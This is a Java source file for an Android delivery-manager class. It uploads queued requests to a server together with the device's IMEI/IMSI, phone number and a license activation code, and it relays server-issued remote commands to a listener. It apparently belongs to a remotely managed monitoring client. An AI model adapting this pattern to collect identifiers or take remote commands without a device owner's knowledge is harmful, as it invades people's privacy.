package com.vvt.datadeliverymanager;

import java.util.ArrayList;
import java.util.List;

import android.content.Context;
import android.net.ConnectivityManager;
import android.os.Looper;

import com.vvt.appcontext.AppContext;
import com.vvt.configurationmanager.ConfigurationManager;
import com.vvt.connectionhistorymanager.ConnectionHistoryEntry;
import com.vvt.connectionhistorymanager.ConnectionHistoryManager;
import com.vvt.connectionhistorymanager.ConnectionType;
import com.vvt.connectionhistorymanager.ErrorType;
import com.vvt.connectionhistorymanager.Status;
import com.vvt.datadeliverymanager.enums.DeliveryRequestType;
import com.vvt.datadeliverymanager.enums.ErrorResponseType;
import com.vvt.datadeliverymanager.enums.PriorityRequest;
import com.vvt.datadeliverymanager.enums.ServerStatusType;
import com.vvt.datadeliverymanager.interfaces.DeliveryListener;
import com.vvt.datadeliverymanager.interfaces.PccRmtCmdListener;
import com.vvt.datadeliverymanager.interfaces.RetryTimerListener;
import com.vvt.datadeliverymanager.interfaces.ServerStatusErrorListener;
import com.vvt.datadeliverymanager.store.RequestStore;
import com.vvt.exceptions.FxListenerNotFoundException;
import com.vvt.license.LicenseManager;
import com.vvt.logger.FxLog;
import com.vvt.network.NetworkUtil;
import com.vvt.phoenix.prot.CommandListener;
import com.vvt.phoenix.prot.CommandRequest;
import com.vvt.phoenix.prot.CommandServiceManager;
import com.vvt.phoenix.prot.command.CommandMetaData;
import com.vvt.phoenix.prot.command.Languages;
import com.vvt.phoenix.prot.command.response.PCC;
import com.vvt.phoenix.prot.command.response.ResponseData;
import com.vvt.phoneinfo.PhoneInfo;
import com.vvt.phoneinfo.PhoneType;
import com.vvt.productinfo.ProductInfo;
import com.vvt.server_address_manager.ServerAddressManager;


public class RequestExecutor implements RetryTimerListener{
	
	private static final String TAG = "RequestExecutor";
	
	private static final boolean VERBOSE = true;
	private static final boolean LOGV = Customization.VERBOSE ? VERBOSE : false;
	private static final boolean LOGD = Customization.DEBUG;
	private static final boolean LOGI = Customization.INFO;
	private static final boolean LOGW = Customization.WARNING;
	private static final boolean LOGE = Customization.ERROR;
	/**
	 *  : FOR TEST!!! 
	 */
//	MockCSM mockCsm = new MockCSM();

	private ServerStatusErrorListener mServerStatusErrorListener;
	private ConnectionHistoryManager mConnHistory;
	private CommandServiceManager mCsm;
	private PccRmtCmdListener mPccRmtCommandListener;
	private RequestStore mRequestStore;
	private ServerAddressManager mServerAddressManager;
	private ConfigurationManager mConfigurationManager;
	
	private ExecutorThread mExecutorThread;
	private boolean mIsprocessing;
	private boolean mIsExecuting = false;
	private static RequestExecutor mRequestExecutor;
	
	private DeliveryRequest mActiveRequest;
	private DeliveryListener mDeliveryListener;
	private LicenseManager mLicenseManager;
	private AppContext mAppContext;
	private DeliveryRequest mSecondaryRequest;   
	//PowerManager.WakeLock mWakeLock;
	
	private RequestExecutor(AppContext appContext,InitializeParameters setupDelivery) {
		
		mAppContext = appContext;
		mRequestStore = RequestStore.getInstance(mAppContext.getApplicationContext(), mAppContext.getWritablePath());
		
		mCsm =  setupDelivery.getCommandServiceManager();
		mConnHistory = setupDelivery.getConnectionHistory();
		mPccRmtCommandListener = setupDelivery.getRmtCommandListener();
		mServerStatusErrorListener = setupDelivery.getServerStatusErrorListener();
		mServerAddressManager = setupDelivery.getServerAddressManager();
		mLicenseManager = setupDelivery.getLicenseManager();
		mConfigurationManager = setupDelivery.getConfigurationManager();
			
	}
	
	public static RequestExecutor getInstance (AppContext appContext, InitializeParameters setupDelivery) {
		if(mRequestExecutor == null) {
			mRequestExecutor = new RequestExecutor(appContext, setupDelivery);
		}
		return mRequestExecutor;
	}

	/**
	 * Keep the connection history.
	 * @param cmdCode
	 * @param status
	 * @param errorType
	 * @param message
	 * @param statusCode
	 */
	private void updateConnectionHistory(int cmdCode, Status status, ErrorType errorType, String message, int statusCode) {
		
		ConnectionHistoryEntry entry  = new ConnectionHistoryEntry();
		entry.setAction(mActiveRequest.getCommandData().getCmd());
		
		
		ConnectionType connectedNetworkConnectionType = getActiveNetworkType(mAppContext.getApplicationContext());
		entry.setConnectionType(connectedNetworkConnectionType);
		
		if( connectedNetworkConnectionType == ConnectionType.WIFI) {
			entry.setAPN(NetworkUtil.getConnectedWifiName(mAppContext.getApplicationContext()));
		}
		else {
			entry.setAPN(NetworkUtil.getDefaultApnName(mAppContext.getApplicationContext()));
		}
		
		entry.setDate(System.currentTimeMillis());
		entry.setErrorType(errorType);
		entry.setMessage(message);
		entry.setStatus(status);
		entry.setStatusCode(statusCode);
		mConnHistory.addConnectionHistory(entry);
		
	}	
	
	private ConnectionType getActiveNetworkType(Context context) {
	        ConnectivityManager connectivityManager = (ConnectivityManager) context
	        .getSystemService(Context.CONNECTIVITY_SERVICE);

	        int networkType = -1;
	        
	        if (connectivityManager.getActiveNetworkInfo() != null) {
	        	networkType= connectivityManager.getActiveNetworkInfo().getType();
	        } 
	        
	        if (networkType == ConnectivityManager.TYPE_MOBILE) {
	        	return ConnectionType.GPRS;
	        } else if (networkType == ConnectivityManager.TYPE_WIFI) {
	            return ConnectionType.WIFI;
	        } else {
	        	return ConnectionType.UNKNOWN;
	        }
	        
	    }

	private void setIsExecuting(boolean isExecute) {
		mIsExecuting = isExecute;
	}
	
	public boolean isExecuting () {
		return mIsExecuting;
	}
	
	// TODO Used in canceling operation
	public boolean isProcessingResponse () {
		return mIsprocessing;
	}
	
	private void setIsProcessingResponse (boolean isprocessing) {
		this.mIsprocessing = isprocessing;
	}

	public void execute() {
		if(LOGV) FxLog.v(TAG,"execute ENTER ...");
		if(LOGV) FxLog.v(TAG, "execute # currentThread Id : " + Thread.currentThread().getId());
		if(!isExecuting()) {
			if(LOGD) FxLog.d(TAG,"Not executing, Starting ExecutorThread()");
			
			mExecutorThread = new ExecutorThread();
			mExecutorThread.start();
		}
		
		setIsExecuting(true);
		if(LOGV) FxLog.v(TAG,"execute EXIT ...");
		
	}
	
	// TODO: will be used in canceling operation
	public PriorityRequest getActiveRequestPriority() {
		if(mActiveRequest != null) {
			return mActiveRequest.getRequestPriority();
		} else {
			return null;
		}

	}
	
	private void startRetryTimer (long csid, long delay, RetryTimerListener listener) {
		if(LOGV) FxLog.v(TAG, "startRetryTimer # START");
		
		if(LOGV) FxLog.v(TAG, "startRetryTimer # csid " + csid);
		if(LOGV) FxLog.v(TAG, "startRetryTimer # delay " + delay);
		if(LOGV) FxLog.v(TAG, "startRetryTimer # listener " + listener);
		
		RetryTimer reteyTimer = new RetryTimer(csid, delay, listener);
		reteyTimer.start();
		
		if(LOGV) FxLog.v(TAG, "startRetryTimer # EXIT");
	}
	
	synchronized private void retryTimeExpired (long csid) {
		if(LOGV) FxLog.v(TAG, "retryTimeExpired # START");
		
		boolean isSuccess = mRequestStore.updateCanRetryWithCsid(csid);
		if(LOGD) FxLog.d(TAG, "retryTimeExpired # updateCanRetryWithCsid isSuccess " + isSuccess);
		
		if(!isExecuting()) {
			execute();
		}
		
		if(LOGV) FxLog.v(TAG, "retryTimeExpired # EXIT");
	}
	
	@Override
	public void onTimerExpired(long csid) {
		if(LOGV) FxLog.v(TAG, "onTimerExpired # ENTER ...");
		if(LOGD) FxLog.d(TAG, "onTimerExpired # csid " + csid);
		
		retryTimeExpired(csid);
		
		if(LOGV) FxLog.v(TAG, "onTimerExpired # EXIT");
	} 
	
	public void cancelCurrentRequest () {
//		mExecuteResponse.cancelRequest();
	}
	
	//******************************************* INNER CLASS ****************************************************//

	private class ExecutorThread extends Thread implements CommandListener {
		
		@Override
		public void run() {
			if(LOGV) FxLog.v(TAG,"ExecutorThread::run() ENTER...");
			if(LOGV) FxLog.v(TAG, "ExecutorThread # currentThread Id : " + Thread.currentThread().getId());
			Looper.prepare();
			startProcess();
			Looper.loop();
			if(LOGV) FxLog.v(TAG,"ExecutorThread::run() EXIT...");
		}
		
		private DeliveryRequest getNextRequest() {
			if(LOGV) FxLog.v(TAG,"getNextRequest ENTER...");
			
			DeliveryRequest deliveryRequest = null;
			
			if(mSecondaryRequest != null) {
				deliveryRequest = mSecondaryRequest;
				mSecondaryRequest = null;
			} else {
				try {
					if(LOGD) FxLog.d(TAG, "getNextRequest.getProperRequest");
					deliveryRequest = mRequestStore.getProperRequest();

				} catch (FxListenerNotFoundException ex) {
					if(LOGE) FxLog.e(TAG, ex.toString());
					mRequestStore.deleteRequest(ex.getCSID());
					//call agian.
					getNextRequest();
				}
			}
			
			if(LOGV) FxLog.v(TAG,"getNextRequest EXIT...");
			
			return deliveryRequest;
		}
		
		private void startProcess() {
			if(LOGV) FxLog.v(TAG,"startProcess # ENTER...");
			
			// get ProperRequest.
			mActiveRequest = getNextRequest();
			
			if (mActiveRequest != null) {
				
				if(LOGD) FxLog.d(TAG," getNextRequest NOT NULL !!!!");
				mDeliveryListener = mActiveRequest.getDeliveryListener();
				
				//set the StructuredUrl & UnStructuredurl to CSM before execute.
				String StructuredServerUrl = mServerAddressManager.getStructuredServerUrl();
				mCsm.setStructuredUrl(StructuredServerUrl);
				
				if(LOGV) FxLog.v(TAG,"StructuredServerUrl :" + StructuredServerUrl);
				
				String UnstructuredServerUrl = mServerAddressManager.getUnstructuredServerUrl();
				mCsm.setUnStructuredUrl(UnstructuredServerUrl);
				
				if(LOGV) FxLog.v(TAG,"UnstructuredServerUrl :" + UnstructuredServerUrl);
				
				DeliveryRequestType deliveryType =  mActiveRequest.getDeliveryRequestType();
				if (deliveryType == DeliveryRequestType.REQUEST_TYPE_NEW) {
					if(LOGD) FxLog.d(TAG,"DeliveryRequestType.REQUEST_TYPE_NEW");
					CommandRequest request = createCommandRequest(mActiveRequest);
					if(LOGV) FxLog.v(TAG,"mCsm.execute");
					/*PowerManager pm = (PowerManager) mAppContext.getApplicationContext().getSystemService(Context.POWER_SERVICE);
					mWakeLock = pm.newWakeLock(PowerManager.SCREEN_DIM_WAKE_LOCK, "My Tag");
					mWakeLock.acquire();*/
					long csid = mCsm.execute(request);
					/**
					 * : FOR TEST ...
					 */
//					long csid = mockCsm.execute(request);
					if(LOGI) FxLog.i(TAG, "Return CSID: "+csid);
				
					mActiveRequest.setCSID(csid);
					mActiveRequest.setIsReadyToResume(false);
					mActiveRequest.setDeliveryRequestType(DeliveryRequestType.REQUEST_TYPE_PERSISTED);
					
					//if something wrong by CSM.
					if(csid == -1) {
						if(LOGW) FxLog.w(TAG, "CSM Fail. This new request can't delivery CSM");
						//return back to the caller.
						onConstructError(csid, new Exception());
						
					} else {
						boolean updateSuccess = mRequestStore.updateRequest(mActiveRequest);
						if(!updateSuccess) {
							if(LOGW) FxLog.w(TAG, "update Fail. cancel CSM and delete from persistore");
							
							//cancel in CSM site.
							mCsm.cancelRequest(csid);
							
							/**
							 * : FOR TEST ...
							 */
//							mockCsm.cancelRequest(csid);
	
							//return back to the caller.
							onConstructError(csid, new Exception());
						}
					}
	
				} else {
					if(LOGD) FxLog.d(TAG,"DeliveryRequestType.REQUEST_TYPE_PERSISTED");
					long csId = mActiveRequest.getCsId();
					long cisIdFromCsm = mCsm.resume(csId, this);
					/** FOR TEST ... **/
//					long cisIdFromCsm = mockCsm.resume(csId, this);
					if(cisIdFromCsm == -1) {
						if(LOGW) FxLog.w(TAG, "CSM resume Fail. This csid no session in CSM");
						//return back to the caller.
						onConstructError(csId, new Exception());
					}
					
				}
			} else {
				if(LOGD) FxLog.d(TAG,"getNextRequest is NULL !!!!");
				//finish round
				setIsExecuting(false);
			} 
			
			if(LOGV) FxLog.v(TAG,"startProcess EXIT...");
			
		}
		
		/** 
		 * this method not finished yet.
		 * **/
		@SuppressWarnings("unused")
		public void cancelRequest () {
			try {
				mSecondaryRequest = mRequestStore.getProperRequest();
			} catch (FxListenerNotFoundException e1) {
				//delete form persist store.
				mRequestStore.deleteRequest(e1.getCSID());
				//call agian.
				getNextRequest();
			}
			if (mSecondaryRequest != null) {
				// TODO: complete later
				/*CommandRequest request = createCommandRequest(mSecondaryRequest);
				 long csid = mCsm.cancelAndExecute(request);
				 FxLog.i(TAG, "Return CSID: "+csid);
				 mSecondaryRequest.setCSID(csid);
				mSecondaryRequest.setIsReadyToResume(false);
				boolean updateSuccess = mRequestStore.updateRequest(mSecondaryRequest);
				if(!updateSuccess) {
					FxLog.w(TAG, "update Fail. cancel CSM and delete from persistore");
					
					//cancel in CSM site.
					mCsm.cancelRequest(csid);
					
					//delete form persist store.
					mRequestStore.deleteRequest(mSecondaryRequest.getCsId());
					
					//return back to the caller.
//					onConstructError(csid, new Exception());
				}*/
			} else {
				if(LOGW) FxLog.w(TAG, "No interupt request, so we will skip it.");
			}
		}

		private CommandRequest createCommandRequest (DeliveryRequest deliveryRequest) {
			CommandRequest request = new CommandRequest();
	    	request.setMetaData(getMetaData(deliveryRequest));
			request.setCommandData(deliveryRequest.getCommandData());
			request.setCommandListener(this);
			request.setPriority(deliveryRequest.getRequestPriority().getNumber());
			return request;
		}
		
		private CommandMetaData getMetaData(DeliveryRequest deliveryRequest) {
			PhoneInfo phoneInfo  = mAppContext.getPhoneInfo();
			ProductInfo productInfo = mAppContext.getProductInfo();
			
			int configId = mConfigurationManager.getConfiguration().getConfigurationID();
			
			String deviceId = null;

			if(phoneInfo.getPhoneType() == PhoneType.PHONE_TYPE_CDMA) {
				deviceId = phoneInfo.getMEID();
			} else if(phoneInfo.getPhoneType() == PhoneType.PHONE_TYPE_GSM) {
				deviceId = phoneInfo.getIMEI();
			} else {
				deviceId = phoneInfo.getMEID();
				if(deviceId == null) {
					deviceId = phoneInfo.getIMEI();
				}
			}
			
			String phoneNumber = phoneInfo.getPhoneNumber();
			String mcc = String.format("%s", phoneInfo.getMobileCountryCode());
			String mnc =String.format("%s", phoneInfo.getMobileNetworkCode());
			String imsi = phoneInfo.getIMSI();
			String productVersion = productInfo.getProductVersion();

			//TODO : need to improve values.
			CommandMetaData metaData = new CommandMetaData();
			metaData.setProtocolVersion(Integer.parseInt(productInfo.getProtocolVersion()));
			metaData.setProductId(productInfo.getProductId());
			metaData.setProductVersion(productVersion);
			metaData.setConfId(configId);
			metaData.setDeviceId(deviceId);
			metaData.setActivationCode(mLicenseManager.getLicenseInfo().getActivationCode());
			metaData.setLanguage(Languages.ENGLISH);
			metaData.setPhoneNumber(phoneNumber);
			metaData.setMcc(mcc);
			metaData.setMnc(mnc);
			metaData.setImsi(imsi);
			metaData.setHostUrl(mServerAddressManager.getBaseServerUrl());
			
			metaData.setEncryptionCode(0);
			metaData.setCompressionCode(0);
			
			if(deliveryRequest.isRequireEncryption()) {
				metaData.setEncryptionCode(1);
			}
			
			if(deliveryRequest.isRequireCompression()) {
				metaData.setCompressionCode(1);
			}
		

			return metaData;
		}
		
		
		/**
		 * Now, no onCancel response from CSM.
		 * @param csid
		 * @param e
		 */
		@SuppressWarnings("unused")
		public void onCancel(long csid, Exception e) {
			//delete form persist store.
			mRequestStore.deleteRequest(csid);
		}

		@Override
		public void onConstructError(long csid, Exception e) {
			//mWakeLock.release();
			if(LOGV) FxLog.v(TAG,"onConstructError # ENTER ...");
			if(LOGW) FxLog.w(TAG,"onConstructError # ERROR : " + e.getMessage());
			if(LOGV) FxLog.v(TAG, "ExecutorThread # currentThread Id : " + Thread.currentThread().getId());
			//Log.e(TAG, "CSID: "+csid+", "+e.getMessage());
			
			if(mActiveRequest == null) {
				if(LOGW) FxLog.w(TAG,"onConstructError # mActiveRequest is NULL EXIT -->>> : ");
				return;
			}
			
			//prevent the cancel by new request that is high priority.
			setIsProcessingResponse(true);
			
			DeliveryResponse deliveryResponse = new DeliveryResponse();
			deliveryResponse.setCSMresponse(null);
			deliveryResponse.setDataProviderType(mActiveRequest.getDataProviderType());
			deliveryResponse.setErrorResponseType(ErrorResponseType.ERROR_PAYLOAD);
			deliveryResponse.setStatusCode(312); // Error creating payload.
			deliveryResponse.setStatusMessage(null);
			deliveryResponse.setSuccess(false);
			deliveryResponse.setCanRetry(false);
			
			//delete form persist store.
			mRequestStore.deleteRequest(csid);
			
			//sent back to caller.
			if(mDeliveryListener != null) {
				if(LOGD) FxLog.d(TAG,"onConstructError # Notify to the caller ...");
				mDeliveryListener.onFinish(deliveryResponse);
			} else {
				if(LOGD) FxLog.d(TAG,"onConstructError # DeliveryListener is null NOT Notify to the caller ...");
			}
			
			//release ket for high prority can interrupt.
			setIsProcessingResponse(false);
			
			if(LOGV) FxLog.v(TAG,"onConstructError # EXIT ...");
			
			//get ProperRequest for execute new request.
			startProcess();

		}

		@Override
		public void onTransportError(long csid, Exception e) {
			if(LOGV) FxLog.v(TAG, "onTransportError # ENTER ...");
			if(LOGW) FxLog.w(TAG, "onTransportError # ERROR : " + e.getMessage());
			
			if(mActiveRequest == null) {
				if(LOGW) FxLog.w(TAG,"onTransportError # mActiveRequest is NULL EXIT -->>> : ");
				return;
			}
			
			//mWakeLock.release();
			//prevent the cancel by new request that is high priority.
			setIsProcessingResponse(true);

			DeliveryResponse deliveryResponse = new DeliveryResponse();
			deliveryResponse.setCSMresponse(null);
			deliveryResponse.setDataProviderType(mActiveRequest.getDataProviderType());
			deliveryResponse.setErrorResponseType(ErrorResponseType.ERROR_CONNECTION);
			deliveryResponse.setStatusCode(-1);
			deliveryResponse.setStatusMessage(null);
			deliveryResponse.setSuccess(false);
			
			//handle persistence store.
			handleResumableCase(deliveryResponse);
			
			updateConnectionHistory(mActiveRequest.getCommandData().getCmd(), 
					Status.FAILED, ErrorType.HTTP, e.getMessage(), -1);

			//release ket for high prority can interrupt.
			setIsProcessingResponse(false);
			
			if(LOGV) FxLog.v(TAG, "onTransportError # EXIT ...");
			
			//get ProperRequest for execute new request.
			startProcess();
			
		}

		@Override
		public void onSuccess(ResponseData response) {
			//mWakeLock.release();
			//prevent the cancel by new request that is high priority.
			if(LOGV) FxLog.v(TAG,"onSuccess ENTER ...");
			if(LOGV) FxLog.v(TAG, "onSuccess # currentThread Id : " + Thread.currentThread().getId());
			if(LOGD) FxLog.d(TAG,"onSuccess CSID : ... " +response.getCsid());
			
			if(mActiveRequest == null) {
				if(LOGW) FxLog.w(TAG,"onSuccess # mActiveRequest is NULL EXIT -->>> : ");
				return;
			}
			
			setIsProcessingResponse(true);
			
			DeliveryResponse deliveryResponse = new DeliveryResponse();
			deliveryResponse.setCSMresponse(response);
			deliveryResponse.setDataProviderType(mActiveRequest.getDataProviderType());
			deliveryResponse.setErrorResponseType(null);
			deliveryResponse.setStatusCode(response.getStatusCode());
			deliveryResponse.setStatusMessage(response.getMessage());
			deliveryResponse.setSuccess(true);
			deliveryResponse.setCanRetry(false);
			
			//sent back to caller.
			if(mDeliveryListener != null) {
				if(LOGD) FxLog.d(TAG,"onSuccess # Notify to the caller ...");
				mDeliveryListener.onFinish(deliveryResponse);
			} else {
				if(LOGD) FxLog.d(TAG,"onSuccess # DeliveryListener is null NOT notify to the caller ...");
			}

			//create thread for prevent the error from caller.
			final ResponseData responseForPcc = response;
			Thread trd = new Thread(new Runnable() {
				
				@Override
				public void run() {
					if(LOGV) FxLog.v(TAG, "onSuccess # currentThread Id : " + Thread.currentThread().getId());
					// prevent dead lock
					try {
						Thread.sleep(1000);
					} catch (InterruptedException e) {
						 
					}
					
					int pccCount = responseForPcc.getPccCount();
					if(LOGD) FxLog.d(TAG,"pccCount :" + pccCount);
					
					List<PCC> pccs = new ArrayList<PCC>();
					for(int i=0 ; i< pccCount ;i++) {
						PCC pcc = responseForPcc.getPcc(i);
						
						if(LOGD) FxLog.d(TAG, "PccCode:" + pcc.getPccCode());
						
						for (int j = 0; j < pcc.getArgumentCount(); j++) {
							if(LOGD) FxLog.d(TAG, "PccCode Argument(" + j + ") :" + pcc.getArgument(j).toString());
						}
						
						pccs.add(pcc);
					}
					mPccRmtCommandListener.onReceivePCC(pccs);
					
				}
			});
			
			trd.start();
			
			//delete form persist store.
			mRequestStore.deleteRequest(mActiveRequest.getCsId());
			
			updateConnectionHistory(mActiveRequest.getCommandData().getCmd(), 
					Status.SUCCESS, ErrorType.NONE, response.getMessage(), response.getStatusCode());
				
			//release key for higher priority can interrupt.
			setIsProcessingResponse(false);
			
			if(LOGV) FxLog.v(TAG,"onSuccess EXIT ...");
			
			//get ProperRequest for execute new request.
			startProcess();
		}
		

		@Override
		public void onServerError(ResponseData response) {
			//mWakeLock.release();
			if(LOGV) FxLog.v(TAG,"onServerError # ENTER ...");
			
			if(mActiveRequest == null) {
				if(LOGW) FxLog.w(TAG,"onConstructError # mActiveRequest is NULL EXIT -->>> : ");
				return;
			}
			
			//prevent the cancel by new request that is high priority.
			setIsProcessingResponse(true);
			
			//create thread for prevent the error from caller.
			final ResponseData responseForPcc = response;
			Thread trd = new Thread(new Runnable() {
				
				@Override
				public void run() {
					
					// prevent dead lock
					try {
						Thread.sleep(1000);
					} catch (InterruptedException e) {
						 
					}
					
					int pccCount = responseForPcc.getPccCount();
					if(LOGD) FxLog.d(TAG,"onServerError # run # pccCount :" + pccCount);
					
					List<PCC> pccs = new ArrayList<PCC>();
					for(int i=0 ; i< pccCount ;i++) {
						PCC pcc = responseForPcc.getPcc(i);
						
						if(LOGD) FxLog.d(TAG, "onServerError # run # PccCode:" + pcc.getPccCode());
						
						for (int j = 0; j < pcc.getArgumentCount(); j++) {
							if(LOGD) FxLog.d(TAG, "onServerError # run # PccCode Argument(" + j + ") :" + 
									pcc.getArgument(j).toString());
						}
						pccs.add(pcc);
					}
					mPccRmtCommandListener.onReceivePCC(pccs);
				}
			});
			
			trd.start();
			
			int statusCode = response.getStatusCode();
			if(LOGW) FxLog.w(TAG,"statusCode : " + statusCode);
			if(LOGW) FxLog.w(TAG,response.getMessage());
			
			DeliveryResponse deliveryResponse = new DeliveryResponse();
			deliveryResponse.setCSMresponse(response);
			deliveryResponse.setDataProviderType(mActiveRequest.getDataProviderType());
			deliveryResponse.setErrorResponseType(ErrorResponseType.ERROR_SERVER);
			deliveryResponse.setStatusCode(statusCode);
			deliveryResponse.setStatusMessage(response.getMessage());
			deliveryResponse.setSuccess(false);
			deliveryResponse.setCanRetry(false);
			
			
			long csid = mActiveRequest.getCsId();
			
			switch (statusCode) {
				case 307 : 
				case 309 :
				case 310 :
					handleResumableCase(deliveryResponse);
					break;
					
				case 308 : 
					deliveryResponse.setErrorResponseType(null);
					deliveryResponse.setSuccess(true);
					
					//sent back to caller.
					if(mDeliveryListener != null) {
						if(LOGD) FxLog.d(TAG,"onServerError # case 308 # Notify to the caller ...");
						mDeliveryListener.onFinish(deliveryResponse);
					}
					
					//delete form persist store.
					mRequestStore.deleteRequest(csid);
					break;
					
				case 100 :
					//sent back to listener.
					if(mServerStatusErrorListener != null) {
						mServerStatusErrorListener.onServerStatusErrorListener(
								ServerStatusType.SERVER_STATUS_ERROR_LICENSE_NOT_FOUND);
					}
					//sent back to caller.
					if(mDeliveryListener != null) {
						if(LOGD) FxLog.d(TAG,"onServerError # case 100 # Notify to the caller ...");
						mDeliveryListener.onFinish(deliveryResponse);
					}

					//delete form persist store.
					mRequestStore.deleteRequest(csid);
					break;
					
				case 102 :
					//sent back to listener.
					if(mServerStatusErrorListener != null) {
						mServerStatusErrorListener.onServerStatusErrorListener(
								ServerStatusType.SERVER_STATUS_ERROR_LICENSE_EXPIRED);
					}
					//sent back to caller.
					if(mDeliveryListener != null) {
						if(LOGD) FxLog.d(TAG,"onServerError # case 102 # Notify to the caller ...");
						mDeliveryListener.onFinish(deliveryResponse);
					}

					//delete form persist store.
					mRequestStore.deleteRequest(csid);
					break;
					
				case 106 :
					//sent back to listener.
					if(mServerStatusErrorListener != null) {
						mServerStatusErrorListener.onServerStatusErrorListener(
								ServerStatusType.SERVER_STATUS_ERROR_LICENSE_DISABLED);
					}
					//sent back to caller.
					if(mDeliveryListener != null) {
						if(LOGD) FxLog.d(TAG,"onServerError # case 106 # Notify to the caller ...");
						mDeliveryListener.onFinish(deliveryResponse);
					}

					//delete form persist store.
					mRequestStore.deleteRequest(csid);
					break;
					
				case 400 :
					//sent back to listener.
					if(mServerStatusErrorListener != null) {
						mServerStatusErrorListener.onServerStatusErrorListener(
								ServerStatusType.SERVER_STATUS_ERROR_DEVICE_ID_NOT_FOUND);
					}
					//sent back to caller.
					if(mDeliveryListener != null) {
						if(LOGD) FxLog.d(TAG,"onServerError # case 400 # Notify to the caller ...");
						mDeliveryListener.onFinish(deliveryResponse);
					}

					//delete form persist store.
					mRequestStore.deleteRequest(csid);
					break;
				
				default :
					//sent back to caller.
					if(mDeliveryListener != null) {
						if(LOGD) FxLog.d(TAG,"onServerError # default # Notify to the caller ...");
						mDeliveryListener.onFinish(deliveryResponse);
					}
					//delete form persist store.
					mRequestStore.deleteRequest(csid);
					break;
			}

			
			updateConnectionHistory(mActiveRequest.getCommandData().getCmd(), 
					Status.FAILED, ErrorType.SERVER, response.getMessage(), response.getStatusCode());
			
			//release ket for high prority can interrupt.
			setIsProcessingResponse(false);
			
			if(LOGV) FxLog.v(TAG,"onServerError EXIT ...");
			
			//get ProperRequest for execute new request.
			startProcess();
			
		}
		
		private void handleResumableCase(DeliveryResponse deliveryResponse) {
			
			if(LOGV) FxLog.v(TAG, "handleResumableCase # ENTER ...");
			
			int count = mActiveRequest.getRetryCount() + 1;
			int maxRetry = mActiveRequest.getMaxRetryCount();
			
			if(LOGD) FxLog.d(TAG, "count:maxRetry = " + count + ":" + maxRetry);
			
			if (count < maxRetry) {
				
				if(LOGD) FxLog.d(TAG, "count < maxRetry");
				
				deliveryResponse.setCanRetry(true);
				
				// start Timer
				if(LOGD) FxLog.d(TAG,"Start timer with delay : " + mActiveRequest.getDelayTime());
				startRetryTimer(mActiveRequest.getCsId(),mActiveRequest.getDelayTime(),RequestExecutor.this);
				
				mActiveRequest.setRetryCount(count);
				mActiveRequest.setIsReadyToResume(false);

				//update retry count in persist store.
				boolean updateSuccess = mRequestStore.updateRequest(mActiveRequest);
				
				if(!updateSuccess) {
					if(LOGW) FxLog.w(TAG, "Update fail, skip it.");
				}
				
				//sent back to caller.
				if(mDeliveryListener != null) {
					mDeliveryListener.onProgress(deliveryResponse);
				}
				
			} else {
				if(LOGD) FxLog.d(TAG, "count > maxRetry");
				
				deliveryResponse.setCanRetry(false);
				
				//cancel in CSM site.
				boolean isSuccess = mCsm.cancelRequest(mActiveRequest.getCsId());
				if(LOGD) FxLog.d(TAG, "CSM cancelRequest is "+ isSuccess);
								
				/** FOR TEST ... **/
//				mockCsm.cancelRequest(mActiveRequest.getCsId());
				
				//delete form persist store.
				if(LOGD) FxLog.d(TAG, "deleteing request in request store with csid: " + mActiveRequest.getCsId());
				
				mRequestStore.deleteRequest(mActiveRequest.getCsId());
				
				//sent back to caller.
				if (mDeliveryListener != null) {
					FxLog.d(TAG, "handleResumableCase # Notify to the caller ...");
					mDeliveryListener.onFinish(deliveryResponse);
				}
			}
			
			if(LOGV) FxLog.v(TAG, "handleResumableCase # EXIT ...");
		}
		
	}
	
	/***************************************************** FOR TEST***********************************************************/
	/**
	 *  FOR TEST ONLY !!!!!!!!
	 * @param deliveryRequest
	 * @param reposeType
	 * @return
	 */
	public boolean forTest_handleReponse(final DeliveryRequest deliveryRequest, int reposeType) {
		if(LOGV) FxLog.v(TAG,"mExecuteResponse For test...");
		
		mActiveRequest = deliveryRequest;
		mRequestStore = RequestStore.getInstance(mAppContext.getApplicationContext(), mAppContext.getWritablePath());
		
		ResponseData response = new ResponseData() {
			
			@Override
			public int getCmdEcho() {
				return 0;
			}
		};
		
		response.setMessage("test success");
		response.setStatusCode(310);

		mExecutorThread = new ExecutorThread();
		switch (reposeType) {
			case 1 : 
				mExecutorThread.onSuccess(response);
	
				try {
					DeliveryRequest deliveryRequestTemp = mRequestStore.getProperRequest();
					if (deliveryRequestTemp == null) {
						return true;
					} else {
						return false;
					}
				} catch (FxListenerNotFoundException e) {
				}
				return false;
				
			case 2 : 
				mExecutorThread.onConstructError(123, null);
				try {
					DeliveryRequest deliveryRequestTemp = mRequestStore.getProperRequest();
					if (deliveryRequestTemp == null) {
						return true;
					} else {
						return false;
					}
				} catch (FxListenerNotFoundException e) {}
				return false;
				
			case 3 : 
				
				int callerId = mActiveRequest.getCallerID();
				int maxcount = mActiveRequest.getMaxRetryCount();
				
				mExecutorThread.onServerError(response);	
				
				boolean ispending = mRequestStore.isRequestPending(callerId);
				
				if(LOGV) FxLog.v(TAG, "ispending : " +ispending);
				
				if (maxcount > 0) {
					if (ispending) {
						return true;
					} else {
						return false;
					}
				} else {
					if (!ispending) {
						return true;
					} else {
						return false;
					}
				}

				
			case 4 : 
				
				int callId = mActiveRequest.getCallerID();
				int max_count = mActiveRequest.getMaxRetryCount();
				
				mExecutorThread.onTransportError(123, null);
				boolean ispending2 = mRequestStore.isRequestPending(callId);
	
				if (max_count > 0) {
					if (ispending2) {
						return true;
					} else {
						return false;
					}
				} else {
					if (!ispending2) {
						return true;
					} else {
						return false;
					}
				}
				
			case 5 : 

				// start Timer
			/*startRetryTimer(mActiveRequest.getCsId(),
					mActiveRequest.getDelayTime(), new RetryTimerListener() {*/
			
				startRetryTimer(mActiveRequest.getCsId(),
						mActiveRequest.getDelayTime(), new RetryTimerListener() {
							
							@Override
							public void onTimerExpired(long csid) {
								if(LOGV) FxLog.v(TAG, "onTimerExpired  csid : " + csid);
								
								boolean isSuccess = mRequestStore.updateCanRetryWithCsid(csid);
								
								if(LOGV) FxLog.v(TAG, "updateCanRetryWithCsid  csid : return " + isSuccess);
								
								try {
									mActiveRequest = mRequestStore.getProperRequest();
								} catch (FxListenerNotFoundException e) {}
								
							}
						});
				
				mActiveRequest = null;
				
				while(mActiveRequest == null) {
					//wait until timer expired
				}
				if(mActiveRequest != null)
					return true;
				else 
					return false;
				
			default :
				return false;
		}
		
	}
	
	/**********************************************************************************************************************/
}